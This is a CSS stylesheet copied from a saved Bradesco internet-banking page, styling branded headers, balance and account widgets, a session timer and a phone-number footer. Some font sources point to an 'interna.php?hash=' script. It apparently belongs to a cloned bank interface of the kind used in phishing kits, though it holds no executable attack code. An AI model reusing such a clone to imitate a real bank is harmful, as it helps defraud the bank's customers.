            min-height: 360px;
            max-width: 308px;
        }

        .aviso[_ngcontent-tfo-c11] {
            display: flex;
            flex-direction: column;
            max-height: 250px;
        }

        .aviso[_ngcontent-tfo-c11] h3[_ngcontent-tfo-c11] {
            flex: 0 0 auto;
            width: 80%;
            font-size: 1rem;
            line-height: 1.5rem;
            font-weight: 500;
            margin-bottom: 16px;
        }

        .aviso[_ngcontent-tfo-c11] p[_ngcontent-tfo-c11] {
            color: rgb(53, 54, 58);
            font-size: 0.875rem;
            line-height: 1.5rem;
            margin: 2px 0px;
        }


        brad-carousel {
            display: block;
            width: 100%;
        }

        brad-carousel .slides {
            position: relative;
            display: flex;
            overflow: hidden;
        }

        brad-carousel brad-carousel-slide {
            flex: 0 0 100%;
            display: block;
            opacity: 0;
            transition: all 0.4s ease 0s;
        }

        brad-carousel brad-carousel-slide.active {
            opacity: 1;
        }

        brad-carousel brad-carousel-next,
        brad-carousel brad-carousel-prev {
            display: inline-block;
        }


        .btn-primary.btn-effects:hover {
            background-color: rgb(225, 23, 63);
            border-color: rgb(225, 23, 63);
            cursor: pointer;
        }

        .btn-primary.btn-effects:focus {
            background-color: rgb(197, 0, 48);
            border-color: rgb(197, 0, 48);
        }

        .btn-primary.btn-effects:active {
            background-color: rgb(175, 0, 43);
            border-color: rgb(175, 0, 43);
        }

        .btn-primary.btn-effects:disabled {
            background-color: rgb(167, 168, 172);
            border-color: rgb(167, 168, 172);
            cursor: default;
        }


        brad-timeline {
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        brad-timeline * {
            box-sizing: border-box;
        }

        brad-timeline-periodo {
            flex: 1 1 auto;
            position: relative;
            display: flex;
            flex-wrap: wrap;
            justify-content: flex-end;
        }

        brad-timeline-periodo .data {
            flex: 0 0 57px;
            display: flex;
            align-items: center;
            max-width: 57px;
            padding: 8px 22px 8px 0px;
        }

        brad-timeline-periodo .data span {
            display: block;
            color: rgb(71, 72, 76);
            text-align: center;
        }

        brad-timeline-periodo .data span:first-child {
            font: 500 1.125rem / 1.25 Montserrat, sans-serif;
        }

        brad-timeline-periodo .data span:last-child {
            font: 0.75rem / 1 Montserrat, sans-serif;
        }

        brad-timeline-periodo brad-timeline-lancamento {
            flex: 0 0 calc(100% - 57px);
            max-width: calc(100% - 57px);
        }

        brad-timeline-lancamento {
            position: relative;
            display: flex;
            align-items: center;
            padding: 8px 0px 8px 16px;
            border-left: thin solid rgb(200, 201, 204);
        }

        brad-timeline-lancamento>* {
            width: 100%;
        }

        brad-timeline-lancamento::after,
        brad-timeline-lancamento::before {
            content: "";
            position: absolute;
            display: block;
            top: 50%;
            transform: translateY(-50%);
            border-radius: 50%;
        }

        brad-timeline-lancamento::before {
            left: -4px;
            width: 8px;
            height: 8px;
            background-color: rgb(200, 201, 204);
        }

        brad-timeline-lancamento::after {
            left: -3px;
            width: 6px;
            height: 6px;
            background-color: rgb(255, 255, 255);
        }

        brad-timeline-lancamento:first-of-type::before {
            background-color: rgb(255, 255, 255);
        }

        brad-timeline-lancamento:first-of-type::after {
            background-color: rgb(0, 0, 0);
        }


        brad-header {
            display: block;
            position: fixed;
            top: 0px;
            width: 100%;
            z-index: 100;
        }

        brad-menu {
            display: block;
            position: fixed;
            top: 88px;
            width: 100%;
            min-width: 1024px;
            z-index: 90;
        }

        #app-wrapper[_ngcontent-xfy-c0] {
            flex: 1 1 auto;
            min-width: 342px;
        }


        * {
            box-sizing: border-box;
        }

        body,
        html {
            min-height: 100%;
            height: 100%;
        }

        body {
            font-family: Montserrat, sans-serif;
            background-color: rgb(238, 239, 241);
        }

        h1,
        h2,
        h3,
        h4,
        h5 {
            margin: 0px;
        }

        h1 {
            font-weight: 600;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h2 {
            font-weight: 500;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h3 {
            font-weight: 500;
            font-size: 1rem;
            line-height: 1.1875rem;
        }

        h4 {
            font-weight: 500;
            font-size: 0.875rem;
            line-height: 1.125rem;
        }

        .text-right {
            text-align: right;
        }

        a {
            color: rgb(211, 211, 211);
            text-decoration: none;
        }

        i.ico {
            box-sizing: border-box;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 16px;
            height: 16px;
        }

        i.ico svg {
            width: 16px;
            height: 16px;
        }

        .container {
            width: 100%;
            max-width: 972px;
            margin: 0px auto;
        }

        .container * {
            box-sizing: border-box;
        }

        .grid {
            position: relative;
            display: flex;
            flex-wrap: wrap;
        }

        @media (min-width: 768px) {
            .grid {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }
        }

        @media (max-width: 768px) {
            .grid {
                margin-left: 8px;
                margin-right: 8px;
            }
        }

        .cell {
            overflow: hidden;
            font-size: 0.625rem;
            flex-grow: 0;
            flex-shrink: 1;
        }

        .cell.cell-card>* {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        @media (min-width: 768px) {
            .grid.grid-8 {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }

            .cell {
                flex-basis: calc(8.33333% - 24px);
                margin: 0px 12px;
            }
        }

        @media (min-width: 768px) {
            .cell.large-3 {
                flex-basis: calc(25% - 24px);
            }
        }

        @media (min-width: 768px) {
            .cell.large-4 {
                flex-basis: calc(33.3333% - 24px);
            }

            .cell.cell-card.large-4 {
                flex-basis: calc(33.3333% - 4px);
                padding: 0px 10px;
                margin: 0px 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-4 {
                flex-basis: calc(33.3333% - 24px);
            }
        }

        @media (min-width: 768px) {
            .cell.large-6 {
                flex-basis: calc(50% - 24px);
            }

            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 4px);
                padding: 0px 10px;
                margin: 0px 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media (min-width: 768px) {
            .cell.large-8 {
                flex-basis: calc(66.6667% - 24px);
            }

            .cell.cell-card.large-8 {
                flex-basis: calc(66.6667% - 4px);
                padding: 0px 10px;
                margin: 0px 2px;
            }
        }

        @media not all,
        not all {
            .cell.cell-card.large-8 {
                flex-basis: calc(66.6667% - 24px);
            }
        }

        @media (min-width: 768px) {
            .cell.large-9 {
                flex-basis: calc(75% - 24px);
            }
        }

        @media (min-width: 768px) {
            .cell.large-12 {
                flex-basis: calc(100% - 24px);
            }
        }

        @media (max-width: 768px) {
            .cell {
                flex-basis: calc(100% - 16px);
                margin: 0px 8px;
            }

            .cell .grid {
                margin-left: -8px;
                margin-right: -8px;
            }
        }

        @media (min-width: 768px) {
            .grid-8 .cell {
                flex-basis: calc(12.5% - 24px);
                margin: 0px 12px;
            }
        }

        @media (min-width: 768px) {
            .grid-8 .cell.large-4 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media not all,
        not all {

            .grid-8 .cell.large-4:first-child,
            .grid-8 .cell.large-4:last-child {
                flex-basis: calc(50% - 48px);
            }
        }

        .btn {
            font-size: 14px;
            font-weight: 700;
            line-height: 24px;
            color: rgb(0, 0, 0);
            background-color: transparent;
            border: 1px solid rgb(0, 0, 0);
            padding: 8px 40px;
            outline: 0px;
            transition: all 0.3s ease 0s;
            font-family: Montserrat, sans-serif;
            border-radius: 40px !important;
        }

        a.btn {
            appearance: none;
            user-select: none;
            display: inline-block;
            text-align: center;
        }

        .btn-medium {
            line-height: 24px;
            padding: 8px 40px;
            border-radius: 40px;
            font-size: 14px;
        }

        .btn-primary {
            background-color: rgb(255, 0, 62);
            border: thin solid rgb(255, 0, 62);
            color: rgb(255, 255, 255);
        }

        .btn-secondary {
            background-color: rgb(255, 255, 255);
            border: thin solid rgb(255, 0, 62);
            color: rgb(255, 0, 62);
        }

        .btn-block {
            max-width: 95%;
            width: 100%;
            margin: 0px auto;
        }

        .card-header {
            flex: 0 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 1rem 0px;
        }

        .card-header a {
            color: rgb(59, 105, 255);
            font-size: 0.75rem;
            line-height: 0.9375rem;
        }

        .card {
            flex: 1 0 auto;
            padding: 24px;
            border-radius: 4px;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.15) 0px 0px 2px 0px, rgba(0, 0, 0, 0.15) 0px 2px 4px 0px;
            box-sizing: border-box;
            margin-bottom: 1rem;
        }

        .card-grid {
            padding: 24px 0px;
        }

        .card-grid .cell:first-child {
            padding-left: 24px;
        }

        .card-grid .cell:last-child {
            padding-right: 24px;
        }

        footer {
            width: 100%;
            padding-top: 24px;
        }

        footer .cell.large-8 {
            padding-left: 12px;
        }

        @media not all,
        not all {
            footer {
                padding-left: 0px;
            }

            footer .seguranca {
                margin-left: -4px;
            }
        }

        footer .logo {
            margin: 0px 0px 29px;
            line-height: 0;
            position: relative;
        }

        footer .fone-facil h2 {
            font-size: 0.875rem;
            font-weight: 700;
            line-height: 1.143;
            margin: 0px 0px 8px;
        }

        footer .fone-facil h3 {
            font-size: 0.75rem;
            font-weight: 450;
            line-height: 1.333;
            margin: 0px 0px 8px;
        }

        footer .fone-facil h4 {
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1.143;
            margin: 8px 0px 16px;
        }

        footer .fone-facil h4.tel-sac-deficiencia {
            margin-bottom: 0px;
        }

        footer .fone-facil p {
            font-size: 0.75rem;
            font-weight: 500;
            line-height: 1.1665;
            margin: 0px;
        }

        footer .fone-facil .large-4 {
            min-width: 0px;
        }

        footer .fone-facil .cell.large-4:nth-child(3) {
            position: relative;
        }

        footer .fone-facil .cell.large-4:nth-child(3)::after {
            content: "";
            position: absolute;
            top: 45%;
            transform: translateY(-50%);
            right: 30px;
            width: 1px;
            height: 110px;
        }

        footer .whatsapp-bia {
            display: flex;
            align-items: flex-end;
            padding: 8px 0px;
        }

        footer .whatsapp-bia span.qrcode {
            height: 45px;
            width: 45px;
            background-image: url('./images/qr-code-whatsapp-bia.png');
            background-repeat: no-repeat;
            background-size: contain;
            background-color: rgb(255, 255, 255);
        }

        footer .whatsapp-bia>* {
            display: inline-block;
            vertical-align: middle;
            line-height: 1;
        }

        footer .whatsapp-bia> :not(:first-child) {
            margin: 0px 0px 0px 8px;
        }

        footer .whatsapp-bia p {
            font-size: 0.75rem;
        }

        footer .cell.large-4.seguranca {
            margin-top: 56px;
            display: block;
            justify-content: flex-end;
        }

        footer .cell.large-4.seguranca .card.seguranca {
            margin-bottom: 0px;
            border-radius: 2px;
            padding: 16px 24px;
            max-width: 248px;
            height: 160px;
        }

        footer .cell.large-4.seguranca .card.seguranca>* {
            display: block;
        }

        footer .cell.large-4.seguranca .card.seguranca h2 {
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1.714;
            margin: 0px 0px 16px;
        }

        footer .cell.large-4.seguranca .card.seguranca p {
            font-size: 0.75rem;
            font-weight: 400;
            line-height: 1.333;
            margin: 0px;
        }

        footer .cell.large-4.seguranca .card.seguranca a {
            font-size: 0.875rem;
            font-weight: 400;
            line-height: 1.143;
            margin: 24px 0px 0px;
        }

        footer .backdrop {
            background-color: rgba(0, 0, 0, 0.5);
            margin-top: 24px;
            padding-top: 16px;
            padding-bottom: 24px;
        }

        footer .backdrop a {
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 450;
            line-height: 1.143;
        }

        footer .backdrop a svg {
            width: 16px;
            margin-left: 4px;
            transition: all 0.4s ease 0s;
        }

        footer .backdrop a.hide svg {
            transform: rotate(-90deg);
        }

        footer .telefones .grid {
            background-color: inherit;
            border-bottom: thin solid rgb(167, 168, 172);
        }

        footer .telefones .grid .cell {
            white-space: nowrap;
        }

        footer .telefones .grid .cell h3 {
            font-size: 0.875rem;
            font-weight: 700;
            margin: 0px 0px 8px;
        }

        footer .telefones .grid .cell h4,
        footer .telefones .grid .cell p {
            font-size: 0.875rem;
            font-weight: 500;
            line-height: 1rem;
            margin: 0px 0px 8px;
        }

        footer .telefones .grid .cell .tel {
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1rem;
            margin: 0px 0px 24px;
        }

        footer .telefones .grid .cell .fale-conosco {
            font-size: 0.9375rem;
            line-height: 1.5rem;
        }

        footer .telefones .grid .cell .fale-conosco a {
            color: rgb(59, 105, 255);
        }

        footer .telefones {
            overflow: hidden;
            height: 2562px;
            transition: height 0.4s ease 0s;
        }

        footer .telefones.hide {
            height: 0px;
        }

        footer .telefones .telefones-cartoes {
            padding: 48px 0px 56px;
        }

        footer .telefones .telefones-cartoes .cell:nth-child(1) h3 {
            margin: 0px 0px 8px;
        }

        footer .telefones .telefones-cartoes .cell:nth-child(1) p {
            margin: 0px 0px 40px;
        }

        footer .telefones .telefones-previdencia {
            padding: 56px 0px;
        }

        footer .telefones .telefones-previdencia .cell:nth-child(1) h3 {
            margin: 0px 0px 40px;
        }

        footer .telefones .telefones-previdencia .cell:nth-child(2) p:nth-of-type(3),
        footer .telefones .telefones-previdencia .cell:nth-child(2) p:nth-of-type(5),
        footer .telefones .telefones-previdencia .cell:nth-child(2) p:nth-of-type(6) {
            margin-bottom: 24px;
        }

        footer .telefones .telefones-previdencia .cell:nth-child(3) p:nth-of-type(4) {
            margin-bottom: 56px;
        }

        footer .telefones .telefones-previdencia .cell:nth-child(3) p:nth-of-type(5) {
            margin-bottom: 24px;
        }

        footer .telefones .telefones-seguros {
            padding: 64px 0px 56px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(1) h3 {
            margin-bottom: 40px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(2) p:nth-of-type(3) {
            margin-bottom: 56px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(2) p:nth-of-type(5) {
            margin-bottom: 40px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(3) .container-tel {
            display: flex;
        }

        footer .telefones .telefones-seguros .cell:nth-child(3) .container-tel span {
            margin-bottom: 16px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(3) .container-tel span p {
            margin-bottom: 8px;
        }

        footer .telefones .telefones-seguros .cell:nth-child(3) .container-tel span+span {
            margin-left: 160px;
        }

        footer .telefones .telefones-sinistro-prestamista {
            padding: 64px 0px 56px;
        }

        footer .telefones .telefones-sinistro-prestamista .cell:nth-child(1) h3 {
            margin-bottom: 40px;
        }

        footer .telefones .telefones-sinistro-prestamista .cell:nth-child(2) h4:nth-child(1) {
            line-height: 1.5rem;
        }

        footer .telefones .telefones-sinistro-prestamista .cell:nth-child(2) p:nth-of-type(6) {
            margin-bottom: 24px;
        }

        footer .telefones .telefones-sinistro-prestamista .cell:nth-child(3) h4:nth-child(1) {
            line-height: 1.5rem;
        }

        footer .telefones .telefones-capitalizacao {
            padding: 56px 0px;
            border-bottom: none;
        }

        footer .telefones .telefones-capitalizacao .cell:nth-child(1) h3 {
            margin-bottom: 40px;
        }

        footer.prime {
            color: rgb(255, 255, 255);
            background-image: linear-gradient(90deg, rgb(20, 36, 99) 0px, rgb(3, 70, 148) 100%);
        }

        footer.prime .logo {
            background-image: url('./images/bradesco2.png');
            background-size: 112px 26px;
            width: 112px;
            height: 26px;
        }

        footer.prime .fone-facil h3,
        footer.prime .fone-facil p {
            color: rgba(255, 255, 255, 0.75);
        }

        footer.prime .fone-facil .cell.large-4:nth-child(3)::after {
            background-color: rgba(255, 255, 255, 0.5);
        }

        footer.prime .whatsapp-bia p {
            color: rgb(255, 255, 255);
        }

        footer.prime .card h2,
        footer.prime .card p {
            color: rgb(74, 74, 74);
        }

        footer.prime .card a {
            color: rgb(59, 105, 255);
        }

        footer.prime .backdrop {
            background-image: linear-gradient(90deg, rgb(103, 104, 110) 0px, rgb(186, 187, 196) 100%);
        }

        footer.prime .backdrop a {
            color: rgb(255, 255, 255);
        }

        footer.prime .telefones {
            background-color: rgb(228, 229, 233);
        }

        footer.prime .telefones h3 {
            color: rgb(0, 0, 0);
        }

        footer.prime .telefones .fale-conosco,
        footer.prime .telefones h4,
        footer.prime .telefones p {
            color: rgb(71, 72, 76);
        }

        footer.prime .telefones .tel {
            color: rgb(0, 0, 0);
        }

        footer.prime .telefones a {
            color: rgb(59, 105, 255);
        }

        /*! CSS Used keyframes */
        @-webkit-keyframes appear {
            0% {
                transform: scale(.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes appear {
            0% {
                transform: scale(.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @-webkit-keyframes appear {
            0% {
                transform: scale(0.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes appear {
            0% {
                transform: scale(0.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /*! CSS Used fontfaces */
        @font-face {
            font-family: icomoon;
            src: url(./css/icomoon.eot);
            src: url(./css/icomoon.eot?#iefix) format("embedded-opentype"), url(./css/fontes/icomoon.woff2) format("woff2"), url(./css/fontes/icomoon.woff) format("woff"), url(./css/icomoon.ttf) format("truetype"), url(./css/icomoon.svg#svgFontName) format("svg");
        }

        @font-face {
            font-family: icomoon;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Light"), local("Montserrat-Light"), url(./css/Montserrat-Light.ttf) format("truetype");
            font-weight: 300;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Light"), local("Montserrat-LightItalic"), url(./css/Montserrat-LightItalic.ttf) format("truetype");
            font-weight: 300;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Regular"), url(./css/fontes/Montserrat-Regular.ttf) format("truetype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Italic"), url(./css/Montserrat-Italic.ttf) format("truetype");
            font-weight: 400;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Medium"), local("Montserrat-Medium"), url(./css/fontes/Montserrat-Medium.ttf) format("truetype");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Medium"), local("Montserrat-MediumItalic"), url(./css/Montserrat-MediumItalic.ttf) format("truetype");
            font-weight: 500;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat SemiBold"), local("Montserrat-SemiBold"), url(./css/fontes/Montserrat-SemiBold.ttf) format("truetype");
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat SemiBold"), local("Montserrat-SemiBoldItalic"), url(./css/Montserrat-SemiBoldItalic.ttf) format("truetype");
            font-weight: 600;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Bold"), url(./css/fontes/Montserrat-Bold.ttf) format("truetype");
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-BoldItalic"), url(./css/Montserrat-BoldItalic.ttf) format("truetype");
            font-weight: 700;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Light"), local("Montserrat-Light"), format("truetype");
            font-weight: 300;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 300;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Regular"), format("truetype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 400;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Medium"), local("Montserrat-Medium"), format("truetype");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 500;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat SemiBold"), local("Montserrat-SemiBold"), format("truetype");
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 600;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Bold"), format("truetype");
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 700;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Light"), local("Montserrat-Light"), format("truetype");
            font-weight: 300;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Light"), local("Montserrat-LightItalic"), url(./interna.php?hash=144903246963fbdcf88b6615.74675978) format("truetype");
            font-weight: 300;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Regular"), format("truetype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Italic"), url(./interna.php?hash=144903246963fbdcf88b6615.74675978) format("truetype");
            font-weight: 400;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Medium"), local("Montserrat-Medium"), format("truetype");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat Medium"), local("Montserrat-MediumItalic"), url(./interna.php?hash=144903246963fbdcf88b6615.74675978) format("truetype");
            font-weight: 500;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat SemiBold"), local("Montserrat-SemiBold"), format("truetype");
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat SemiBold"), local("Montserrat-SemiBoldItalic"), url(./interna.php?hash=144903246963fbdcf88b6615.74675978) format("truetype");
            font-weight: 600;
            font-style: italic;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-Bold"), format("truetype");
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: Montserrat;
            src: local("Montserrat"), local("Montserrat-BoldItalic"), url(./interna.php?hash=144903246963fbdcf88b6615.74675978) format("truetype");
            font-weight: 700;
            font-style: italic;
        }


        .top-bar * {
            box-sizing: border-box;
        }

        .top-bar header {
            position: relative;
            display: flex;
            width: 100%;
            min-width: 1024px;
            max-width: 1440px;
            height: 88px;
            padding: 0px 24px;
            margin: 0px auto;
        }

        @media not all,
        not all {
            .top-bar header {
                min-width: 0px;
            }
        }

        .top-bar header>div {
            flex: 1 0 0px;
            display: flex;
            align-items: center;
        }

        .top-bar header>div:nth-child(1) {
            flex-basis: 0px;
        }

        .top-bar header>div:nth-child(2) {
            flex: 1 1 0px;
            justify-content: center;
        }

        .top-bar header>div:nth-child(2) brad-busca {
            width: 100%;
        }

        .top-bar header>div:nth-child(3) {
            flex-grow: 1.2;
            flex-basis: 0px;
            justify-content: flex-end;
        }

        .top-bar header>div:nth-child(3)> :not(:first-child) {
            margin-left: 16px;
        }

        .logo {
            position: absolute;
            background-repeat: no-repeat;
            background-position: 50% 50%;
        }

        .logo h1 {
            opacity: 0;
            user-select: none;
        }

        .data {
            align-self: flex-start;
            margin-top: 44px;
            white-space: nowrap;
            font-size: 0.75rem;
            font-weight: 500;
            line-height: 1rem;
            text-transform: uppercase;
        }

        .logout button {
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            padding: 0px 0px 0px 5px;
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1rem;
            border: none;
            background-color: transparent;
        }

        .logout button .ico {
            width: 18px;
            height: 18px;
            margin-left: 8px;
        }

        .logout button .ico svg {
            width: inherit;
            height: inherit;
        }

        @-webkit-keyframes appear {
            0% {
                transform: scale(0.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes appear {
            0% {
                transform: scale(0.87);
                opacity: 0;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .top-bar header .logo {
            transition: all 0.77s ease 0s;
            left: 24px;
            transform: translateX(0px);
        }

        .top-bar header>div> :not(.logo) {
            transform: scale(0.87);
            opacity: 0;
            animation-name: appear;
            animation-duration: 0.77s;
            animation-timing-function: ease;
            animation-delay: 385ms;
            animation-fill-mode: forwards;
        }

        .top-bar.loading header .logo {
            left: 50%;
            transform: translateX(-50%);
        }

        .top-bar.classic {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(225, 23, 63) 0px, rgb(224, 23, 64) 20%, rgb(221, 24, 71) 36%, rgb(216, 25, 81) 50%, rgb(210, 26, 92) 62%, rgb(202, 27, 103) 71%, rgb(194, 28, 114) 78%, rgb(184, 29, 124) 83%, rgb(174, 30, 134) 87%, rgb(164, 31, 143) 90%, rgb(154, 32, 150) 93%, rgb(145, 33, 156) 95%, rgb(138, 33, 161) 96%, rgb(133, 34, 164) 98%, rgb(131, 34, 165) 100%);
        }

        .top-bar.classic header .logo {
            background-image: url('images/bradesco.svg');
            background-repeat: no-repeat;
            background-position: center center;
            width: 158px;
            height: 48px;
            top: 16px;
        }

        .top-bar.classic header .data {
            color: rgb(255, 255, 255);
            margin-left: 178px;
        }

        .top-bar.classic header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.classic header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.classic header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.classic header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.classic header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.classic header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.classic header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.classic header .sessao svg circle {
            stroke: rgb(204, 97, 164);
        }

        .top-bar.classic header .sessao svg circle.remaining {
            stroke: rgb(243, 199, 227);
        }

        .top-bar.classic header .sessao svg circle.bkg {
            fill: rgb(127, 20, 87);
        }

        .top-bar.classic header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(20, 36, 99) 0px, rgb(3, 70, 148) 100%);
        }

        .top-bar.prime header .logo {
            background-image: url('images/bradesco-prime.png');
            background-repeat: no-repeat;
            background-position: center center;
            width: 104px;
            height: 40px;
            top: 24px;
        }

        .top-bar.prime header .data {
            color: rgb(255, 255, 255);
            margin-left: 124px;
        }

        .top-bar.prime header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.prime header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.prime header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.prime header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.prime header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime header .sessao svg circle {
            stroke: rgb(42, 113, 195);
        }

        .top-bar.prime header .sessao svg circle.remaining {
            stroke: rgb(255, 255, 255);
        }

        .top-bar.prime header .sessao svg circle.bkg {
            fill: rgb(36, 52, 87);
        }

        .top-bar.prime header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.private {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(22, 43, 63) 0px, rgb(73, 96, 120) 100%);
        }

        .top-bar.private header .logo {
            background-image:
                /*savepage-url=bradesco-private.svg*/
                url();
            background-repeat: no-repeat;
            background-position: center center;
            width: 158px;
            height: 48px;
            top: 14px;
        }

        .top-bar.private header .data {
            color: rgb(255, 255, 255);
            margin-left: 178px;
        }

        .top-bar.private header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.private header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.private header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.private header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.private header brad-dados-cliente .usuario .dados-conta h4 {
            color: rgb(255, 255, 255);
        }

        .top-bar.private header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.private header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.private header .sessao svg circle {
            stroke: rgb(150, 173, 191);
        }

        .top-bar.private header .sessao svg circle.remaining {
            stroke: rgb(197, 212, 223);
        }

        .top-bar.private header .sessao svg circle.bkg {
            fill: rgb(45, 84, 113);
        }

        .top-bar.private header .logout button {
            color: rgb(255, 255, 255);
        }

        .top-bar.universitario {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(270deg, rgb(107, 56, 121) 0px, rgb(23, 19, 94) 100%);
        }

        .top-bar.universitario header .logo {
            background-image:
                /*savepage-url=bradesco-universitario.png*/
                url();
            background-repeat: no-repeat;
            background-position: center center;
            width: 56px;
            height: 56px;
            top: 16px;
        }

        .top-bar.universitario header .data {
            color: rgb(255, 255, 255);
            margin-left: 76px;
        }

        .top-bar.universitario header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.universitario header brad-dados-cliente .usuario .saldo-disponivel h5 {
            color: rgba(255, 255, 255, 0.7);
        }

